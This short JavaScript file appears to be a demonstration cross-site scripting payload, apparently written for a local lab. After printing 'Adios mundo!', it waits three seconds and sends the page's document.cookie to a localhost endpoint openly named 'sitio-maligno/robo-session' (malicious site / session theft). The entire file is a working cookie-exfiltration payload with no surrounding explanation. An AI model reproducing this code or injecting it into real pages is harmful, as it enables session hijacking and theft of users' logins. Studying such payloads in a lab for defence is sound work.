/**
 * 
 */

 console.log('Adios mundo!')
 setTimeout(() => {
	fetch(`http://localhost:8080/sitio-maligno/robo-session?cookies=${document.cookie}`)
}, 3000)